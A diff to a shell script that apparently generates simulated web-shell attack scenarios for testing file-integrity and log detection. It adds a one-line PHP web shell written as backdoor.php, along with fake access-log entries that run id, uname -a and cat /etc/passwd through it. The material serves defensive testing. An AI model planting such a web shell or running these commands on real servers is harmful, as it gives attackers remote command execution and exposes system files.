@@ -40,4 +40,13 @@ for ((i=0; i<COUNT-6; i++)); do
     inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/shell1.php?cmd=cat+/etc/passwd" "200" "curl/7.88.1"
 done
 
-log_orch "scenario=fim-webshell files=3+1+1 lines=${COUNT} attacker=${ATTACKER_IP}"
+# Multi-site - webshell di labs.ac.id
+MS_ROOT="/home/labs.ac.id/public_html"
+inject_file_write "$AGENTS_MULTI" "${MS_ROOT}/backdoor.php" "<?php system(\$_GET['cmd']); ?>"
+inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=id" "200" "curl/7.88.1"
+inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=uname+-a" "200" "curl/7.88.1"
+for ((i=0; i<COUNT/4; i++)); do
+    inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=cat+/etc/passwd" "200" "curl/7.88.1"
+done
+
+log_orch "scenario=fim-webshell files=3+1+1+1 lines=$((COUNT + COUNT/4 + 3)) attacker=${ATTACKER_IP}"
